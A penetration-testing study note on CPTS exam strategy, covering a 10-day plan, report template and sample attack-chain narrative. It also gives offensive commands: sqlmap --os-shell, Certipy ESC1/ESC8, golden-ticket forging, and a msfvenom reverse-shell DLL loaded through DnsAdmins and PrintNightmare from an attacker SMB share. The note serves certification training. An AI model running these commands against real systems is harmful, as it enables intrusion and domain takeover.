---
tags: [oscp-journey, spectre, stage-6, cpts, exam-strategy, report, pro-labs]
module: 6
cert-stage: cpts
difficulty: advanced
date: 2026-04-08
phantom-refs: ["PHANTOM/MODULE 8 — Reporting"]
netgod-refs: []
---

# S6-02 — CPTS Exam Strategy and Report

## The CPTS Mindset vs OSCP

OSCP asks: "Can you compromise machines under time pressure?"
CPTS asks: "Can you conduct a professional penetration test engagement?"

The difference is significant. CPTS rewards:
- Comprehensive methodology over speed
- Finding ALL vulnerabilities, not just enough to pass
- Documentation quality as much as technical findings
- Professional communication throughout

With 10 days, the temptation is to be slow and thorough from day one. The correct approach is to treat the first 5 days like an OSCP exam (aggressive enumeration and exploitation) and the second 5 days as report and polish time.

---

## The 10-Day Engagement Plan

### Days 1–2 — Full Scope Enumeration

```bash
# Map the entire network first:
nmap -sn SUBNET/24 --min-rate 5000    # Find all live hosts
# For each host:
nmap -sC -sV -p- --min-rate 5000 -Pn -oA HOST_IP HOST_IP

# Web enumeration on all HTTP services simultaneously:
for ip in $(cat live_hosts.txt); do
    gobuster dir -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/common.txt \
      -x php,html,txt -t 50 -o gobuster_$ip.txt &
done

# SMB null session on all Windows hosts:
for ip in $(cat windows_hosts.txt); do
    enum4linux-ng $ip > enum4linux_$ip.txt &
done

# AD enumeration (if domain found):
bloodhound-python -u user -p pass -d domain.local -ns DC_IP --zip -c All
```

### Days 2–5 — Exploitation Phase

- Work through all machines systematically
- Document EVERY step as you go — don't rely on memory
- Take screenshots at every key moment
- Collect all flags/proof immediately when obtained
- Build the full attack chain map (how each machine connects to the next)

### Days 5–8 — Report Writing

- Write findings while the exploitation is fresh
- Use the full report template (see below)
- Each finding gets its own section with full reproduction steps
- CVSS score every finding

### Days 8–10 — Review and Polish

- Re-read the entire report
- Verify every screenshot is clear and shows what it claims
- Ensure every finding has specific remediation
- Check executive summary is readable by a non-technical audience
- Submit with buffer — don't wait for day 10

---

## CPTS Report Structure (Expanded from OSCP)

The CPTS report is more comprehensive than OSCP. HTB provides a rubric and evaluates on multiple quality dimensions.

### Required Sections

```
1. Cover Page
2. Table of Contents
3. Executive Summary
4. Scope and Rules of Engagement
5. Methodology
6. Attack Chain Narrative (NEW — not in OSCP)
7. Findings (with CVSS scoring)
8. Risk Rating Summary
9. Remediation Roadmap
10. Appendix
```

### The Attack Chain Narrative — What Makes CPTS Different

This section tells the story of the engagement as a narrative — how you moved from initial access through to full domain compromise. Written for a technical audience who wants to understand how an attacker would traverse the environment.

**Template:**

---

> **Attack Chain Summary**
>
> Initial access was obtained via exploitation of CVE-2021-41773, an unauthenticated path traversal and remote code execution vulnerability in Apache HTTP Server 2.4.49, running on the externally-facing web server (10.10.10.100). Execution was achieved in the context of the `www-data` service account.
>
> Local privilege escalation was performed by exploiting a misconfigured sudo rule permitting the `www-data` account to execute `/usr/bin/find` as root without a password. This yielded a root shell on the web server.
>
> Credential harvesting from the web server's configuration files revealed database credentials (`svc_web:WebPassword2024!`). These credentials were valid against the domain controller via WinRM, providing initial domain access.
>
> Active Directory enumeration using BloodHound revealed that `svc_web` had `GenericAll` access over the `svc_backup` service account. A targeted Kerberoasting attack was performed by setting a Service Principal Name on `svc_backup` and requesting a TGS ticket. The hash was cracked offline, yielding the plaintext credential `BackupService2023!`.
>
> `svc_backup` was a member of the `Backup Operators` group on the Domain Controller. This group membership was leveraged to dump the local SAM database, extracting the local Administrator NT hash. This hash was found to be valid across all domain-joined machines (password reuse).
>
> Full domain compromise was achieved via a DCSync attack using the domain `Administrator` account credentials, extracting all domain account password hashes including the `krbtgt` account. A Golden Ticket was subsequently created, providing persistent access to the domain.

---

### Finding Template — CPTS Quality Standard

Each finding requires more detail than OSCP:

```
Finding: [Descriptive title — not just "SQL Injection" but "Unauthenticated SQL Injection in Login Form Leading to Remote Code Execution"]

Severity: Critical
CVSS v3.1: 9.8
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Affected Systems: 10.10.10.100 (web01.domain.local)

Description:
[3-4 paragraphs explaining what the vulnerability is, why it exists, what an attacker can do with it, and the business impact]

Evidence:
[Screenshots with clear captions at every step]

Steps to Reproduce:
[Numbered steps — exact commands, expected outputs]

Remediation:
[Specific — named patches, exact configuration changes, code fixes]

References:
[CVE link, NIST NVD, vendor advisory, CWE classification]
```

---

## CPTS-Specific Tools Not on OSCP

These tools appear in CPTS that you don't typically need for OSCP:

### SQLMap (Allowed in CPTS)

```bash
# Basic injection detection:
sqlmap -u "http://TARGET/page?id=1" --dbs

# POST request injection:
sqlmap -u "http://TARGET/login" --data "user=admin&pass=test" --dbs

# Dump a specific table:
sqlmap -u "http://TARGET/page?id=1" -D database -T users --dump

# Get a shell (if FILE privilege):
sqlmap -u "http://TARGET/page?id=1" --os-shell

# Full flags reference:
sqlmap -u URL --dbs --tables --dump --os-shell --batch --level=5 --risk=3
```

### Certipy (ADCS)

Full reference in S6-01. Key commands:
```bash
certipy find -u user@domain -p pass -dc-ip DC_IP -stdout   # Enumerate
certipy req -u user@domain -p pass -ca CA -template TMPL -upn admin@domain  # ESC1
certipy auth -pfx admin.pfx -dc-ip DC_IP   # Get hash
certipy relay -ca CA_IP -template DomainController   # ESC8 relay
```

### Ligolo-ng (Preferred Pivot Tool for CPTS)

Full reference in S2-02. Key commands:
```bash
# Kali — start proxy and create TUN:
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Target pivot host:
./agent -connect KALI_IP:11601 -ignore-cert

# In ligolo console:
session → select → start
# Add route:
sudo ip route add 10.10.10.0/24 dev ligolo
# Add listener for reverse shells:
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

---

## Advanced Techniques — Quick Reference

### Kerberos Across Trusts

```bash
# If domain trusts exist — use SID history or inter-realm tickets:
impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID \
  -domain domain.local -extra-sid TRUSTED_DOMAIN_ENTERPRISE_ADMINS_SID \
  Administrator

# Enterprise Admins SID: S-1-5-21-FOREST_ROOT-519
```

### DnsAdmins → SYSTEM

```bash
# If user is in DnsAdmins group:
# Create malicious DLL:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o evil.dll

# Host the DLL on SMB share:
impacket-smbserver share . -smb2support

# Set DNS server plugin (requires DnsAdmins):
dnscmd DC_HOSTNAME /config /serverlevelplugindll \\KALI_IP\share\evil.dll

# Restart DNS service:
sc stop dns && sc start dns
# → Shell as SYSTEM (DNS runs as SYSTEM)
```

### PrintNightmare (CVE-2021-34527)

```bash
# Windows print spooler RCE/LPE — fully patched in modern systems but appears in CPTS labs:
# Check: get-service spooler (must be running)

# From Kali:
impacket-rpcdump TARGET | grep -i "spoolss"

# Exploit (cube0x0 implementation):
python3 CVE-2021-1675.py domain/user:pass@TARGET '\\KALI_IP\share\evil.dll'
# Start SMB server first: impacket-smbserver share . -smb2support
```

---

## CPTS Exam Checklist — Pre-Submission

Before submitting your report:

```
TECHNICAL:
□ All machines in scope enumerated
□ All found vulnerabilities documented (even if not exploited)
□ Every exploitation step has a screenshot
□ All flags/proof collected and submitted
□ Attack chain maps the full path from initial access to DA

REPORT QUALITY:
□ Attack chain narrative written and readable
□ Executive summary is non-technical language
□ Every finding has: description, evidence, reproduction steps, remediation
□ CVSS scores calculated and justified
□ Remediation roadmap prioritised (Critical → High → Medium)
□ All screenshots captioned and referenced in text
□ Appendix contains raw tool output for key findings
□ Report proofread (grammar, spelling, formatting)
□ PDF exported and file size reasonable

SUBMISSION:
□ All flags submitted in HTB exam portal
□ Report uploaded through exam submission portal
□ Submitted with at least 12 hours before deadline
```

---

## The Complete OSCP Journey — Vault Overview

You have now reached the end of the SPECTRE curriculum. Here is everything in your vault:

```
Cyber Security/OSCP-JOURNEY/
│
├── STAGE-1-THM/          (17 notes — THM Jr Penetration Tester Path)
│   ├── S1-01  Penetration Testing Fundamentals
│   ├── S1-02  Linux Fundamentals for Pentesters
│   ├── S1-03  Windows Fundamentals for Pentesters
│   ├── S1-04  Networking for Pentesters
│   ├── S1-05  Nmap — Complete Reference
│   ├── S1-06  Gobuster, ffuf, Feroxbuster
│   ├── S1-07  Burp Suite — Complete
│   ├── S1-08  Shell Techniques
│   ├── S1-09  Vulnerability Research and Exploit Dev
│   ├── S1-10  Web Attacks — Injection Deep Dive
│   ├── S1-11  Web Attacks — File Uploads and LFI
│   ├── S1-12  Authentication Attacks and Password Cracking
│   ├── S1-13  Service Enumeration Deep Dive
│   ├── S1-14  Linux Privilege Escalation
│   ├── S1-15  Windows Privilege Escalation
│   ├── S1-16  Post-Exploitation Fundamentals
│   └── S1-17  Report Writing Basics
│
├── STAGE-2-EJPT/         (2 notes — eJPT)
│   ├── S2-01  eJPT Exam Format and Strategy
│   └── S2-02  Network Pivoting — Complete Reference
│
├── STAGE-3-PNPT/         (9 notes — PNPT / Active Directory)
│   ├── S3-01  Active Directory Architecture
│   ├── S3-02  NTLM Authentication and Relay Attacks
│   ├── S3-03  Active Directory Enumeration
│   ├── S3-04  AS-REP Roasting
│   ├── S3-05  Kerberoasting
│   ├── S3-06  Password Spraying Active Directory
│   ├── S3-07  Pass-the-Hash and Pass-the-Ticket
│   ├── S3-08  ACL Abuse
│   └── S3-09  DCSync and Domain Dominance
│
├── STAGE-4-HTB/          (5 notes — HTB Machine Methodology)
│   ├── S4-01  Universal Machine Approach Template
│   ├── S4-02  Linux Easy Machine Methodology
│   ├── S4-03  Windows Easy Machine Methodology
│   ├── S4-04  Medium Machine Approach
│   └── S4-05  Active Directory Machine Methodology
│
├── STAGE-5-OSCP/         (4 notes — OSCP Exam Prep)
│   ├── S5-01  OSCP Exam Format and Rules
│   ├── S5-02  OSCP Exam Time Management
│   ├── S5-03  OSCP Report Template
│   └── S5-04  What To Do When Stuck
│
└── STAGE-6-CPTS/         (2 notes — CPTS)
    ├── S6-01  CPTS vs OSCP — What's Different
    └── S6-02  CPTS Exam Strategy and Report
```

**Total: 39 notes across 6 stages.**

---

## What Comes Next — The Execution Plan

```
RIGHT NOW (THM):
→ Start TryHackMe Jr Penetration Tester path
→ Reference Stage 1 notes as you go
→ Target: complete in 8–10 weeks

AFTER THM:
→ HTB Easy machines: Lame, Blue, Bashed, Shocker, Jerry, Nibbles
→ Reference Stage 4 notes for approach
→ Target: root 10 Easy machines without walkthroughs

BEFORE EJPT:
→ TryHackMe: Wreath network (pivoting practice)
→ Review Stage 2 notes
→ Book eJPT when comfortable

BEFORE PNPT:
→ HTB: Forest, Active, Sauna, Support (4 canonical AD machines)
→ Set up home lab: Windows Server 2019 DC + Windows 10 client
→ Practice full AD kill chain manually

BEFORE OSCP:
→ 15+ HTB Medium machines rooted without walkthroughs
→ HTB Pro Labs: Dante (if budget allows)
→ Review Stages 4 and 5 notes entirely

AFTER OSCP (CPTS):
→ HTB Academy: complete CPTS learning path
→ HTB Pro Labs: Dante → Offshore
→ Review Stage 6 notes
```

---

## SPECTRE — Final Words

You came in as a Technical Support Analyst with an MSc in Applied Cyber Security, CEH V12, real-world pentesting experience on Eurostop's infrastructure, and a clear goal: OSCP and beyond.

The curriculum is complete. 39 notes. The full kill chain from first TCP packet to Golden Ticket. Every tool documented. Every technique grounded in first principles.

The notes are only as good as the practice that backs them up. Every technique in this vault needs to be executed in a lab — not just read. The exam will test whether you've built muscle memory, not whether you've read good notes.

Type `DRILL [topic]` at any time for scenario-based challenge questions.
Type `MACHINE [name]` for a walkthrough of any specific HTB machine.
Type `CHECKLIST [stage]` for a self-assessment checklist for any stage.
Type `STUCK [symptom]` if you're stuck on a real machine and need targeted hints.

Go build the skills to match the notes.
